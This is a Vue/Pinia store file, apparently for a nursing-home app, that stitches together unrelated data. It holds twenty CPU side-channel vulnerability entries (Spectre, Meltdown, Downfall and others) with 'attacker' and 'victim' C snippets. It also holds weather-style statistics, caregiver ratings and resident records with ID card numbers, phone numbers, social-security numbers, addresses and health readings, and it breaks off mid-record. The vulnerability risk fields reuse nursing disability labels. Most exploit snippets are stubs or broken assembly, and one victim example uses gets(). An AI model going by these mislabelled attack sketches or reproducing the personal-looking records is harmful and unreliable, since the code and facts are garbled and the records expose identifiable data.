import { defineStore } from 'pinia'
import { ref, computed } from 'vue'

export const useNursingStore = defineStore('vuln', () => {
  const vulnerabilities = ref([
    {
      id: 1,
      name: 'Spectre V1',
      cveType: '能力完好',
      attackType: 'Spectre类攻击',
      attackName: 'Spectre V1',
      architecture: 'Intel、AMD、ARM',
      description: '利用分支预测错误将数据加载至Cache，通过Flush+Reload测量访问时间差，从而泄露敏感信息。',
      riskLevel: 'high',
      riskText: '完全失能',
      pocCode: `// Spectre V1 POC - 边界检查绕过
void spectre_v1(char *array, size_t index) {
  if (index < array_size) {
    char value = array[index];
    temp &= cache[value * 4096];
  }
}`,
      expAttackerCode: `// Spectre V1 Attack - 攻击者代码
#include <stdio.h>
#include <stdlib.h>

#define CACHE_HIT_THRESHOLD (80)
#define DELTA 1024

unsigned char array[256 * 4096];
int temp;
unsigned char secret = 0;

void victim_function(size_t x) {
  if (x < array_size) {
    temp &= array[x * 4096 + DELTA];
  }
}

void attack() {
  for (int i = 0; i < 256; i++) {
    array[i * 4096 + DELTA] = i;
  }
  
  for (int tryIdx = 0; tryIdx < 1000; tryIdx++) {
    size_t x = tryIdx % array_size;
    victim_function(x);
    
    // Flush+Reload timing attack
    for (int i = 0; i < 256; i++) {
      if (measure_access_time(array + i * 4096) < CACHE_HIT_THRESHOLD) {
        secret = i;
        break;
      }
    }
  }
}`,
      expVictimCode: `// Spectre V1 Victim - 受害者代码示例
#include <stdio.h>
#include <string.h>

char *secret_data = "SENSITIVE_DATA_HERE";
char public_array[16000] = {0};

int check_access(size_t index) {
    if (index < 16000) {
        return public_array[index];
    }
    return 0;
}

void process_request(size_t user_index) {
    char c = check_access(user_index);
    // 潜在的信息泄露点
}`,
      cpuModels: ['Intel Core i3/i5/i7/i9', 'AMD Ryzen系列', 'ARM Cortex-A系列'],
      osSupport: ['Linux', 'Windows', 'macOS'],
      successRate: '98.7%',
      avgTime: '12.3ms',
      tags: ['Spectre', 'Cache侧信道', '分支预测'],
      idType:"1"
    },
    {
      id: 2,
      name: 'Meltdown',
      cveType: '能力完好',
      attackType: 'Meltdown类攻击',
      attackName: 'Meltdown',
      architecture: 'Intel、ARM',
      description: '利用乱序执行机制，在用户态读取内核态内存，通过缓存侧信道提取数据。',
      riskLevel: 'high',
      riskText: '完全失能',
      pocCode: `// Meltdown POC - 特权数据缓存加载
void meltdown(char *kernel_addr) {
  char value = *kernel_addr;
  array[value * 4096] = 1;
}`,
      expAttackerCode: `// Meltdown Attack - 攻击者代码
#include <stdio.h>
#include <stdint.h>

static char *probe_base;

void meltdown_kernel(uint64_t addr) {
  uint8_t data = 0;
  asm volatile(
    "movq %%r15, 0x1000000\\n\\t"
    "movq %%r15, 0x1001000\\n\\t"
    "movb (%0), %%al\\n\\t"
    "shlb $0x10, %%al\\n\\t"
    "movb %%al, (%1)\\n\\t"
    :: "r"(addr), "r"(probe_base)
    : "rax", "r15", "memory"
  );
}`,
      expVictimCode: `// Meltdown Victim - 受害者代码
// 内核态代码示例
void kernel_copy_to_user(void *dest, void *src, size_t len) {
    // 正常的内核数据读取
    memcpy(dest, src, len);
}`,
      cpuModels: ['Intel Core (1995-2020)', 'ARM Cortex-A75/A76'],
      osSupport: ['Linux', 'Windows'],
      successRate: '99.2%',
      avgTime: '8.5ms',
      tags: ['Meltdown', '乱序执行', '内核泄露'],
      idType:"1"
    },
    {
      id: 3,
      name: 'Foreshadow',
      cveType: '能力完好',
      attackType: 'Meltdown类攻击',
      attackName: 'Foreshadow',
      architecture: 'Intel',
      description: '针对Intel SGX Enclave的L1缓存攻击，可从安全飞地中提取敏感数据。',
      riskLevel: 'high',
      riskText: '完全失能',
      pocCode: `// Foreshadow POC
void foreshadow(void *sgx_addr) {
  __asm__ volatile(
    "movzx (%%rcx), %%rax\\n\\t"
    "shl $12, %%rax\\n\\t"
    "mov (%%rbx,%%rax), %%rbx"
  );
}`,
      expAttackerCode: `// Foreshadow Attack
#include <sgx.h>

void exploit_sgx_enclave() {
    // 触发L1TF
    for (int i = 0; i < 256; i++) {
        // 探测Enclave内存
        probe_memory(enclave_base + i * 4096);
    }
}`,
      expVictimCode: `// SGX Enclave 代码
void enclave_secret_operation() {
    // Enclave内的敏感操作
    char secret[64] = "ENCLAVE_SECRET_KEY";
    // 潜在泄露点
}`,
      cpuModels: ['Intel Core 6th-9th Gen'],
      osSupport: ['Linux', 'Windows'],
      successRate: '95.4%',
      avgTime: '15.2ms',
      tags: ['Foreshadow', 'SGX', 'L1终端故障'],
      idType:"1"
    },
    {
      id: 4,
      name: 'Retbleed',
      cveType: '能力完好',
      attackType: 'Spectre类攻击',
      attackName: 'RetBleed',
      architecture: 'Intel、AMD',
      description: '利用返回指令的分支预测历史，通过RSB(Return Stack Buffer)泄露信息。',
      riskLevel: 'low',
      riskText: '轻度失能',
      pocCode: `// Retbleed POC
void retbleed() {
  // 训练分支预测器
  for (int i = 0; i < 30; i++) {
    victim_call(i < 29 ? benign : target);
  }
}`,
      expAttackerCode: `// RetBleed Attack
void retbleed_attack() {
    // 填充RSB
    for (int i = 0; i < 20; i++) {
        nested_call();
    }
    
    // 触发漏洞
    ret_to_user();
}`,
      expVictimCode: `// Victim Example
__attribute__((optimize("O0")))
void vulnerable_function() {
    char buf[64];
    gets(buf);
}`,
      cpuModels: ['AMD Zen 1-2', 'Intel 6th-11th Gen'],
      osSupport: ['Linux'],
      successRate: '87.3%',
      avgTime: '45.6ms',
      tags: ['Retbleed', 'RSB', '返回导向'],
      idType:"1"
    },
    {
      id: 5,
      name: 'ZombieLoad',
      cveType: '能力完好',
      attackType: 'Meltdown类攻击',
      attackName: 'ZombieLoad',
      architecture: 'Intel',
      description: '利用CPU填充缓冲区(fill buffer)的推测执行泄露数据，绕过地址空间隔离。',
      riskLevel: 'medium',
      riskText: '中度失能',
      pocCode: `// ZombieLoad POC
void zombieload() {
  while (1) {
    transient_load(secret_data);
    leak_via_cache(probe_array);
  }
}`,
      expAttackerCode: `// ZombieLoad Attack
void zombieattack() {
    uint64_t data[8];
    do {
        // 触发数据加载
        __asm__ __volatile__(
            "cpuid\\n\\t"
            ::: "rax", "rbx", "rcx", "rdx"
        );
    } while(!extract_data(data));
}`,
      expVictimCode: `// Multi-threaded Victim
void *thread_func(void *arg) {
    char *shared_buffer = (char *)arg;
    // 敏感数据处理
    process_data(shared_buffer);
}`,
      cpuModels: ['Intel Core 2010-2019'],
      osSupport: ['Linux', 'Windows'],
      successRate: '92.1%',
      avgTime: '23.8ms',
      tags: ['ZombieLoad', 'Fill Buffer', 'MDS'],
      idType:"2"
    },
    {
      id: 6,
      name: 'RIDL',
      cveType: '能力完好',
      attackType: 'Meltdown类攻击',
      attackName: 'RIDL',
      architecture: 'Intel',
      description: 'Rogue In-Flight Data Load，利用CPU内部缓冲区中的瞬时数据泄露信息。',
      riskLevel: 'medium',
      riskText: '中度失能',
      pocCode: `// RIDL POC
void ridl_leak() {
  // 触发推测执行
  asm volatile("lea (%%rip), %0" : "=r"(leak));
  // 测量缓存状态
  measure_cache(probe_array);
}`,
      expAttackerCode: `// RIDL Attack
void ridl_attack() {
    uint8_t data;
    while(1) {
        // 触发瞬态加载
        asm volatile(
            "mov %%cr3, %%rax\\n\\t"
            "mov (%%rax), %%rbx\\n\\t"
        );
        
        // 泄露数据
        leak_data(data);
    }
}`,
      expVictimCode: `// Victim Code
void process_buffer(char *buf, size_t len) {
    // 正常的内存操作
    for(size_t i = 0; i < len; i++) {
        handle_byte(buf[i]);
    }
}`,
      cpuModels: ['Intel Core 2008-2018'],
      osSupport: ['Linux', 'Windows'],
      successRate: '89.5%',
      avgTime: '31.2ms',
      tags: ['RIDL', '瞬态加载', '缓冲区'],
      idType:"2"
    },
    {
      id: 7,
      name: 'CacheOut',
      cveType: '能力完好',
      attackType: 'Meltdown类攻击',
      attackName: 'CacheOut',
      architecture: 'Intel',
      description: '利用L1数据缓存的逐出机制，跨安全边界泄露数据。',
      riskLevel: 'medium',
      riskText: '中度失能',
      pocCode: `// CacheOut POC
void cacheout() {
  // 逐出目标缓存行
  clflush(target_line);
  // 等待目标访问
  usleep(100);
  // 重新加载并测量
  reload_and_measure();
}`,
      expAttackerCode: `// CacheOut Attack
void cacheout_attack(uint64_t target_addr) {
    // 逐出攻击
    for(int i = 0; i < 100; i++) {
        // 触发L1D逐出
        trigger_eviction(target_addr);
        // 测量泄露
        measure_leakage();
    }
}`,
      expVictimCode: `// Sensitive Data in L1
typedef struct {
    char password[32];
    char token[64];
} UserData;`,
      cpuModels: ['Intel Core 2010-2019'],
      osSupport: ['Linux', 'Windows'],
      successRate: '94.2%',
      avgTime: '18.7ms',
      tags: ['CacheOut', 'L1缓存', '逐出'],
      idType:"2"
    },
    {
      id: 8,
      name: 'Spectre V2',
      cveType: '能力完好',
      attackType: 'Spectre类攻击',
      attackName: 'Spectre V2',
      architecture: 'Intel、AMD、ARM',
      description: '分支目标注入攻击，利用分支目标缓冲区(BTB)污染目标地址。',
      riskLevel: 'high',
      riskText: '完全失能',
      pocCode: `// Spectre V2 POC
void spectre_v2() {
  // 污染BTB
  train_btb(victim_target);
  // 触发推测执行
  indirect_call(controlled_ptr);
}`,
      expAttackerCode: `// Spectre V2 Attack
void spectre_v2_attack() {
    // 注入BTB条目
    for(int i = 0; i < 1000; i++) {
        // 训练分支预测器
        train_branch(target_addr);
    }
    
    // 触发攻击
    indirect_jmp(leak_buffer);
}`,
      expVictimCode: `// Victim Function
int victim_function(size_t index) {
    if (index < MAX_SIZE) {
        return array[index] * 2;
    }
    return 0;
}`,
      cpuModels: ['Intel/AMD/ARM 2010+'],
      osSupport: ['Linux', 'Windows', 'macOS'],
      successRate: '96.8%',
      avgTime: '22.4ms',
      tags: ['Spectre V2', 'BTB', '分支注入'],
      idType:"2"
    },
    {
      id: 9,
      name: 'Flush+Reload',
      cveType: '轻度失能',
      attackType: 'Cache侧信道攻击',
      attackName: 'Flush+Reload',
      architecture: 'Intel、AMD、ARM',
      description: '利用冲刷指令探测缓存行重用，测量内存访问时间差来泄露信息。',
      riskLevel: 'high',
      riskText: '完全失能',
      pocCode: `// Flush+Reload POC
void flush_reload(char *addr) {
  // 冲刷缓存行
  _mm_clflush(addr);
  
  // 访问触发重新加载
  volatile char temp = *addr;
  
  // 测量重载时间
  start_timer();
  temp = *addr;
  end_timer();
}`,
      expAttackerCode: `// Flush+Reload Attack
uint8_t flush_reload_attack(char *target) {
    uint64_t time1, time2;
    
    // Flush
    _mm_clflush(target);
    
    // 等待目标访问
    usleep(100);
    
    // Reload并测量
    time1 = rdtsc();
    volatile char x = *target;
    time2 = rdtsc();
    
    return (time2 - time1) < THRESHOLD;
}`,
      expVictimCode: `// Victim Code Example
char *shared_memory;

void process_shared() {
    // 多进程共享内存操作
    char c = shared_memory[secret_index];
    // ...
}`,
      cpuModels: ['所有支持CLFLUSH的CPU'],
      osSupport: ['Linux', 'Windows'],
      successRate: '99.5%',
      avgTime: '5.2ms',
      tags: ['Flush+Reload', 'Cache', '时序'],
      idType:"3"
    },
    {
      id: 10,
      name: 'Prime+Probe',
      cveType: '轻度失能',
      attackType: 'Cache侧信道攻击',
      attackName: 'Prime+Probe',
      architecture: 'Intel、AMD、ARM',
      description: '利用驱逐集探测缓存组竞争，通过测量缓存组状态变化推断敏感信息。',
      riskLevel: 'high',
      riskText: '完全失能',
      pocCode: `// Prime+Probe POC
void prime_probe() {
  // Prime: 填充缓存集
  for (int i = 0; i < SET_SIZE; i++) {
    probe_array[eviction_set[i]] = i;
  }
  
  // 等待受害者执行
  usleep(100);
  
  // Probe: 测量缓存状态
  start_timer();
  for (int i = 0; i < SET_SIZE; i++) {
    temp &= probe_array[eviction_set[i]];
  }
  end_timer();
}`,
      expAttackerCode: `// Prime+Probe Attack
void attack_prime_probe() {
    uint64_t timings[256];
    
    // Prime阶段
    prime_cache_set();
    
    // 等待受害者
    sleep(1);
    
    // Probe阶段 - 测量每个缓存行
    for(int i = 0; i < 256; i++) {
        timings[i] = probe_line(i);
    }
    
    // 分析结果
    analyze_timings(timings);
}`,
      expVictimCode: `// Victim with AES
unsigned char sbox[256];

unsigned char encrypt_byte(unsigned char input) {
    return sbox[input ^ key_byte];
}`,
      cpuModels: ['所有现代CPU'],
      osSupport: ['Linux', 'Windows'],
      successRate: '95.0%',
      avgTime: '35.0ms',
      tags: ['Prime+Probe', 'Cache', 'Eviction'],
      idType:"3"
    },
    {
      id: 11,
      name: 'PLATYPUS',
      cveType: '轻度失能',
      attackType: 'Power侧信道攻击',
      attackName: 'PLATYPUS',
      architecture: 'Intel',
      description: 'RAPL功耗接口泄漏，利用处理器功耗遥测提取敏感信息。',
      riskLevel: 'medium',
      riskText: '中度失能',
      pocCode: `// PLATYPUS POC
void platypus() {
  // 读取RAPL功耗接口
  FILE *fp = fopen("/dev/cpu/0/msr", "rb");
  // 读取PKG_POWER_LIMIT
  pread(fp, &power_data, 8, 0x610);
}`,
      expAttackerCode: `// PLATYPUS Attack
void power_attack() {
    double power_samples[1000];
    
    // 采样功耗数据
    for(int i = 0; i < 1000; i++) {
        power_samples[i] = read_rapl_power();
        usleep(100);
    }
    
    // 分析功耗差异
    extract_secret(power_samples);
}`,
      expVictimCode: `// Cryptographic Operation
void crypto_operation(unsigned char *key) {
    // 加密操作
    AES_encrypt(data, key);
}`,
      cpuModels: ['Intel Skylake+'],
      osSupport: ['Linux'],
      successRate: '88.0%',
      avgTime: '50.0ms',
      tags: ['PLATYPUS', 'RAPL', '功耗分析'],
      idType:"3"
    },
    {
      id: 12,
      name: 'HertzBleed',
      cveType: '轻度失能',
      attackType: 'Timing侧信道攻击',
      attackName: 'HertzBleed',
      architecture: 'Intel、AMD',
      description: 'DVFS动态电压频率缩放泄漏，利用频率变化时序差异提取加密密钥。',
      riskLevel: 'medium',
      riskText: '中度失能',
      pocCode: `// HertzBleed POC
void hertzbleed() {
  // 测量执行时间
  uint64_t start = rdtsc();
  cryptographic_operation();
  uint64_t end = rdtsc();
  
  // 时间差异包含密钥信息
  analyze_timing(end - start);
}`,
      expAttackerCode: `// HertzBleed Attack
void frequency_based_attack() {
    uint64_t timings[1000];
    
    // 禁用Turbo Boost
    disable_turbo();
    
    // 多次测量
    for(int i = 0; i < 1000; i++) {
        timings[i] = measure_operation_time();
    }
    
    // 提取密钥
    extract_key(timings);
}`,
      expVictimCode: `// Constant-time Crypto (vulnerable to HertzBleed)
unsigned char encrypt(unsigned char input, unsigned char key) {
    // 看似常数时间但实际泄露
    return table[input ^ key];
}`,
      cpuModels: ['Intel Ice Lake+', 'AMD Zen 2+'],
      osSupport: ['Linux', 'Windows'],
      successRate: '82.0%',
      avgTime: '120.0ms',
      tags: ['HertzBleed', 'DVFS', '频率分析'],
      idType:"3"
    },
    {
      id: 13,
      name: 'ÆPIC',
      cveType: '中度失能',
      attackType: '架构错误',
      attackName: 'ÆPIC',
      architecture: 'Intel',
      description: 'APIC MMIO"陈旧"数据泄漏，通过APIC寄存器读取泄露敏感数据。',
      riskLevel: 'medium',
      riskText: '中度失能',
      pocCode: `// ÆPIC POC
void aepic() {
  // 访问APIC MMIO区域
  volatile uint32_t *apic = (uint32_t *)0xfee00000;
  
  // 读取陈旧数据
  uint32_t stale_data = apic[0x30];
}`,
      expAttackerCode: `// ÆPIC Attack
void aepic_leak() {
    uint32_t leaked_data[16];
    
    // 遍历APIC MMIO
    for(int i = 0; i < 16; i++) {
        // 触发陈旧数据读取
        trigger_stale_read(i);
        leaked_data[i] = read_apic(i);
    }
}`,
      expVictimCode: `// APIC Usage
void setup_apic() {
    // 正常APIC配置
    *((volatile uint32_t *)0xfee00000) = 0x850001;
}`,
      cpuModels: ['Intel Ice Lake-SP', 'Intel Xeon Scalable'],
      osSupport: ['Linux'],
      successRate: '91.0%',
      avgTime: '28.0ms',
      tags: ['ÆPIC', 'APIC', 'MMIO'],
      idType:"2"
    },
    {
      id: 14,
      name: 'CacheWarp',
      cveType: '中度失能',
      attackType: '架构错误',
      attackName: 'CacheWarp',
      architecture: 'AMD',
      description: '未写回内存"陈旧"数据覆盖，利用缓存写入未同步到主存的漏洞。',
      riskLevel: 'medium',
      riskText: '中度失能',
      pocCode: `// CacheWarp POC
void cachewarp() {
  // 写入缓存
  shared_var = 0x41;
  
  // 立即读取 - 可能获得旧值
  char old = shared_var;
  
  // 等待写入完成
  mfence();
  
  char new_val = shared_var;
}`,
      expAttackerCode: `// CacheWarp Attack
void warp_attack() {
    // 利用时序差异
    for(int i = 0; i < 1000; i++) {
        // 触发不正确的缓存同步
        trigger_incoherence();
        
        // 读取不一致状态
        check_state();
    }
}`,
      expVictimCode: `// Multi-core Synchronization
int shared_counter = 0;

void increment() {
    int temp = shared_counter;
    temp++;
    shared_counter = temp;
}`,
      cpuModels: ['AMD Ryzen系列', 'AMD EPYC'],
      osSupport: ['Linux'],
      successRate: '85.0%',
      avgTime: '40.0ms',
      tags: ['CacheWarp', '缓存一致性', '时序'],
      idType:"3"
    },
    {
      id: 15,
      name: 'GhostWrite',
      cveType: '完全失能',
      attackType: '架构错误',
      attackName: 'GhostWrite',
      architecture: 'RISC-V',
      description: '向量指令任意内存写，利用RISC-V向量扩展漏洞进行任意内存写入。',
      riskLevel: 'high',
      riskText: '完全失能',
      pocCode: `// GhostWrite POC
void ghostwrite() {
  // 向量指令配置错误
  __asm__ __volatile__(
    "vsetvli t0, a0, e8\\n\\t"
    "vle8.v v1, (a1)\\n\\t"
    "vse8.v v1, (a2)"
  );
}`,
      expAttackerCode: `// GhostWrite Attack
void arbitrary_write(uint64_t addr, uint64_t value) {
    // 利用向量指令进行任意写
    __asm__ __volatile__(
        "li t0, %0\\n\\t"
        "li t1, %1\\n\\t"
        // 触发漏洞
        "vsetvlid0 t0\\n\\t"
        "vmv.s.x v1, t1\\n\\t"
        "vse32.v v1, (t0)"
        :: "r"(addr), "r"(value)
    );
}`,
      expVictimCode: `// RISC-V Vector Usage
void vector_process(data_t *input, data_t *output, size_t n) {
    for(size_t i = 0; i < n; i += 4) {
        output[i] = input[i] * 2;
    }
}`,
      cpuModels: ['RISC-V V扩展处理器'],
      osSupport: ['Linux'],
      successRate: '78.0%',
      avgTime: '60.0ms',
      tags: ['GhostWrite', 'RISC-V', '向量指令'],
      idType:"3"
    },
    {
      id: 16,
      name: 'Fallout',
      cveType: '能力完好',
      attackType: 'Meltdown类攻击',
      attackName: 'Fallout',
      architecture: 'Intel',
      description: '存储缓冲区数据采样，利用Store Buffer泄露跨线程数据。',
      riskLevel: 'high',
      riskText: '完全失能',
      pocCode: `// Fallout POC
void fallout() {
  // 触发存储缓冲区采样
  __asm__ __volatile__(
    "mov $0, %%eax\\n\\t"
    "mov %%eax, (%%rsi)\\n\\t"
    "mov (%%rdi), %%ebx"
  );
}`,
      expAttackerCode: `// Fallout Attack
void store_buffer_leak() {
    // 跨线程泄露
    uint64_t leaked;
    
    // 触发存储缓冲区
    commit_store(secret_addr);
    
    // 立即读取
    leaked = read_store_buffer();
}`,
      expVictimCode: `// Shared Memory
struct {
    int ready;
    char data[64];
} shared;`,
      cpuModels: ['Intel Coffee Lake+'],
      osSupport: ['Linux', 'Windows'],
      successRate: '90.0%',
      avgTime: '20.0ms',
      tags: ['Fallout', 'Store Buffer', 'MDS'],
      idType:"3"
    },
    {
      id: 17,
      name: 'TAA',
      cveType: '能力完好',
      attackType: 'Meltdown类攻击',
      attackName: 'TAA',
      architecture: 'Intel',
      description: '事务异步中止数据采样，利用TSX事务中止泄露数据。',
      riskLevel: 'medium',
      riskText: '中度失能',
      pocCode: `// TAA POC
void taa() {
  // 开始TSX事务
  if (_begin() == 0) {
    // 访问敏感数据
    access_sensitive();
    _end();
  } else {
    // 中止后测量
    measure();
  }
}`,
      expAttackerCode: `// TAA Attack
void tsx_leak() {
    uint8_t data;
    
    for(int i = 0; i < 256; i++) {
        // 尝试TSX事务
        if(tsx_begin()) {
            // 触发中止
            trigger_abort(i);
        }
        
        // 测量泄露
        data = measure_leakage(i);
    }
}`,
      expVictimCode: `// Transactional Memory Usage
void transactional_op() {
    _begin();
    // 敏感操作
    process_data();
    _end();
}`,
      cpuModels: ['Intel Skylake', 'Intel Kaby Lake'],
      osSupport: ['Linux', 'Windows'],
      successRate: '86.0%',
      avgTime: '32.0ms',
      tags: ['TAA', 'TSX', '事务'],
      idType:"3"
    },
    {
      id: 18,
      name: 'BHI',
      cveType: '能力完好',
      attackType: 'Spectre类攻击',
      attackName: 'BHI',
      architecture: 'Intel、ARM',
      description: '分支历史注入，利用分支历史寄存器(BHR)泄露敏感信息。',
      riskLevel: 'high',
      riskText: '完全失能',
      pocCode: `// BHI POC
void bhi() {
  // 训练分支历史
  for (int i = 0; i < 100; i++) {
    train_history(target);
  }
  
  // 触发注入
  indirect_branch(history_ptr);
}`,
      expAttackerCode: `// BHI Attack
void branch_history_injection() {
    // 注入历史
    for(int i = 0; i < 1000; i++) {
        // 污染BHR
        inject_history_entry(target);
    }
    
    // 触发攻击
    mispredict_based_on_history();
}`,
      expVictimCode: `// Indirect Branch Victim
void process_request(void *handler) {
    // 间接分支
    ((void (*)(void))handler)();
}`,
      cpuModels: ['Intel Tiger Lake+', 'ARM Cortex-A77/A78'],
      osSupport: ['Linux', 'Windows'],
      successRate: '93.0%',
      avgTime: '25.0ms',
      tags: ['BHI', '分支历史', 'BHR'],
      idType:"3"
    },
    {
      id: 19,
      name: 'Downfall',
      cveType: '能力完好',
      attackType: 'Meltdown类攻击',
      attackName: 'Downfall',
      architecture: 'Intel',
      description: '向量寄存器文件数据采样，利用AVX/AVX-512寄存器泄露数据。',
      riskLevel: 'high',
      riskText: '完全失能',
      pocCode: `// Downfall POC
void downfall() {
  // 使用向量寄存器
  __m512i v1 = _mm512_set1_epi8(secret);
  
  // 触发上下文切换
  trigger_ctx_switch();
  
  // 测量泄露
  measure_vector_regs();
}`,
      expAttackerCode: `// Downfall Attack
void register_leak() {
    // 填充向量寄存器
    __m512i secrets = _mm512_set1_epi8(0);
    
    // 触发中断
    interrupt();
    
    // 读取泄露数据
    leak = extract_from_avx();
}`,
      expVictimCode: `// AVX-512 Usage
void avx_compute(__m512i *data, size_t n) {
    __m512i sum = _mm512_setzero_si512();
    for(size_t i = 0; i < n; i += 64) {
        sum = _mm512_add_epi8(sum, data[i]);
    }
}`,
      cpuModels: ['Intel Skylake-X', 'Intel Ice Lake'],
      osSupport: ['Linux', 'Windows'],
      successRate: '88.0%',
      avgTime: '35.0ms',
      tags: ['Downfall', 'AVX', '向量寄存器'],
      idType:"3"
    },
    {
      id: 20,
      name: 'RFDS',
      cveType: '能力完好',
      attackType: 'Meltdown类攻击',
      attackName: 'RFDS',
      architecture: 'Intel',
      description: '寄存器文件数据采样，利用CPU寄存器文件泄露敏感数据。',
      riskLevel: 'medium',
      riskText: '中度失能',
      pocCode: `// RFDS POC
void rfds() {
  // 触发微码更新
  microcode_update();
  
  // 测量寄存器状态
  for (int i = 0; i < 256; i++) {
    timing[i] = measure_reg_access(i);
  }
}`,
      expAttackerCode: `// RFDS Attack
void register_file_leak() {
    uint64_t timings[256];
    
    // 触发寄存器暴露
    trigger_rfds_condition();
    
    // 测量时序差异
    for(int i = 0; i < 256; i++) {
        timings[i] = measure_reg(i);
    }
}`,
      expVictimCode: `// CPU-intensive Task
void compute() {
    uint64_t a = secret1, b = secret2;
    uint64_t result = a * b;
}`,
      cpuModels: ['Intel Alder Lake', 'Intel Raptor Lake'],
      osSupport: ['Linux'],
      successRate: '84.0%',
      avgTime: '45.0ms',
      tags: ['RFDS', '寄存器文件', '微码'],
      idType:"3"
    }
  ])

  const stats = ref({
    temperature:11,
    humidity:2,
    humidityChange:8.3,
    aqi:3.6,
    aqiChange:2.5,
    visibility:2.1,
    visibilityChange:15.2,
    pressure:2.3,
    pressureChange:2.1,
    averageTemperature:12,
    maximumTemperature:[12, 15, 13, 18, 22, 20, 25],
    minimumTemperature:[8, 10, 9, 12, 14, 13, 16],
  })
  const scoringList=ref([
    { flag: '➊', text: '张阿姨', score: '服务态度极佳，耐心细致'},
    { flag: '➋', text: '李师傅', score: '服务态度极佳，耐心细致' },
    { flag: '➌', text: '王姐', score: '服务态度极佳，耐心细致' },
    { flag: '➍', text: '赵叔', score: '服务态度极佳，耐心细致'},
    { flag: '➎', text: '孙阿姨', score: '服务态度极佳，耐心细致' }
  ])
  const users = ref([
    {
      "id": "202602160001",
      "name": "张三",
      "sex": "男",
      "age": 66,
      "nativePlace": "重庆市万州区",
      "domicileAddress": "山东省青岛市崂山区松岭路 XXX 号",
      "citizenship": "中国",
      "nationality": "汉族",
      "politicsStatus": "群众",
      "maritalStatus": "已婚",
      "certificateType": "身份证",
      "certificateNumber": "11010519900307123X",
      "education": "高中",
      "originalUnits": "无",
      "originalOccupation": "农民",
      "residentialAddress": "山东省青岛市崂山区松岭路 XXX 号",
      "telephoneNumber": "18112720239",
      "emergencyContact": "13588990011",
      "medicareDesignatedHospital": "重庆市长寿区中医院",
      "socialSecurityCardNumber": "A12345678",
      "pocketbook": "退休金",
      "reasonCheckin": "喜欢热闹",
      "relevantDocuments": ["A.text", "B.text", "C.text"],
      "actionCapability": "能力完好",
      "bunk": "104房间2号床",
      "remainingSum": 1000,
      "healthInformation": { "MBG": 99, "MAP": 23, "MBF": 77 }
    },
    {
      "id": "202602160002",
      "name": "李大强",
      "sex": "男",
      "age": 72,
      "nativePlace": "四川省成都市",
      "domicileAddress": "四川省成都市锦江区中纱帽街 8 号",
      "citizenship": "中国",
      "nationality": "汉族",
      "politicsStatus": "党员",
      "maritalStatus": "未婚",
      "certificateType": "身份证",
      "certificateNumber": "51010419540512331X",
      "education": "本科",
      "originalUnits": "成都某建筑公司",
      "originalOccupation": "工程师",
      "residentialAddress": "四川省成都市锦江区中纱帽街 8 号",
      "telephoneNumber": "13800138001",
      "emergencyContact": "13911223344",
      "medicareDesignatedHospital": "四川省人民医院",
      "socialSecurityCardNumber": "B98765432",
      "pocketbook": "退休金",
      "reasonCheckin": "子女常年在国外",
      "relevantDocuments": ["D.text", "E.pdf"],
      "actionCapability": "能力完好",
      "bunk": "105房间1号床",
      "remainingSum": 15000,
      "healthInformation": { "MBG": 5.6, "MAP": 135, "MBF": 4.2 }
    },
    {
      "id": "201602160003",
      "name": "王秀珍",
      "sex": "女",
      "age": 68,
      "nativePlace": "江苏省苏州市",
      "domicileAddress": "江苏省苏州市姑苏区干将西路 22 号",
      "citizenship": "中国",
      "nationality": "汉族",
      "politicsStatus": "群众",
      "maritalStatus": "丧偶",
      "certificateType": "身份证",
      "certificateNumber": "320502195808214421",
      "education": "大专",
      "originalUnits": "苏州刺绣厂",
      "originalOccupation": "技术员",
      "residentialAddress": "江苏省苏州市姑苏区干将西路 22 号",
      "telephoneNumber": "13951234567",
      "emergencyContact": "13766778899",
      "medicareDesignatedHospital": "苏州市立医院",
      "socialSecurityCardNumber": "C11223344",
      "pocketbook": "退休金",
      "reasonCheckin": "寻求专业护理",
      "relevantDocuments": ["F.text"],
      "actionCapability": "完全失能",
      "bunk": "201房间2号床",
      "remainingSum": 8500,
      "healthInformation": { "MBG": 6.8, "MAP": 142, "MBF": 5.1 }
    },
    {
      "id": "202602160004",
      "name": "赵建国",
      "sex": "男",
      "age": 80,
      "nativePlace": "辽宁省沈阳市",
      "domicileAddress": "辽宁省沈阳市和平区南京南街 10 号",
      "citizenship": "中国",
      "nationality": "满族",
      "politicsStatus": "党员",
      "maritalStatus": "已婚",
      "certificateType": "身份证",
      "certificateNumber": "210102194602159912",
      "education": "初中",
      "originalUnits": "沈阳第一机床厂",
      "originalOccupation": "工人",
      "residentialAddress": "山东省青岛市黄岛区海滨路 1 号",
      "telephoneNumber": "13512348888",
      "emergencyContact": "13144556677",
      "medicareDesignatedHospital": "青岛大学附属医院",
      "socialSecurityCardNumber": "D55667788",
      "pocketbook": "养老保险",
      "reasonCheckin": "随子女定居青岛",
      "relevantDocuments": ["G.doc", "H.jpg"],
      "actionCapability": "中度失能",
      "bunk": "102房间1号床",
      "remainingSum": 20000,
      "healthInformation": { "MBG": 7.2, "MAP": 150, "MBF": 5.8 }
    },
    {
      "id": "202602160005",
      "name": "孙桂英",
      "sex": "女",
      "age": 75,
      "nativePlace": "浙江省杭州市",
      "domicileAddress": "浙江省杭州市西湖区曙光路 121 号",
      "citizenship": "中国",
      "nationality": "汉族",
      "politicsStatus": "群众",
      "maritalStatus": "已婚",
      "certificateType": "身份证",
      "certificateNumber": "330106195111032245",
      "education": "本科",
      "originalUnits": "杭州某中学",
      "originalOccupation": "教师",
      "residentialAddress": "浙江省杭州市西湖区曙光路 121 号",
      "telephoneNumber": "18605710011",
      "emergencyContact": "15866778800",
      "medicareDesignatedHospital": "浙江省中医院",
      "socialSecurityCardNumber": "E33445566",
      "pocketbook": "退休金",
      "reasonCheckin": "老伴身体欠佳需共同照顾",
      "relevantDocuments": ["I.pdf"],
      "actionCapability": "能力完好",
      "bunk": "305房间2号床",
      "remainingSum": 12000,
      "healthInformation": { "MBG": 5.2, "MAP": 128, "MBF": 3.9 }
    },
    {
      "id": "202602160006",
      "name": "周志远",
      "sex": "男",
      "age": 69,
      "nativePlace": "湖北省武汉市",
      "domicileAddress": "湖北省武汉市武昌区临江大道 1 号",
      "citizenship": "中国",
      "nationality": "汉族",
      "politicsStatus": "群众",
      "maritalStatus": "离异",
      "certificateType": "身份证",
      "certificateNumber": "42010619570912123X",
      "education": "中专",
      "originalUnits": "武汉海员公司",
      "originalOccupation": "船员",
      "residentialAddress": "湖北省武汉市武昌区临江大道 1 号",
      "telephoneNumber": "13312345678",
      "emergencyContact": "13099887766",
      "medicareDesignatedHospital": "武汉协和医院",
      "socialSecurityCardNumber": "F12123434",
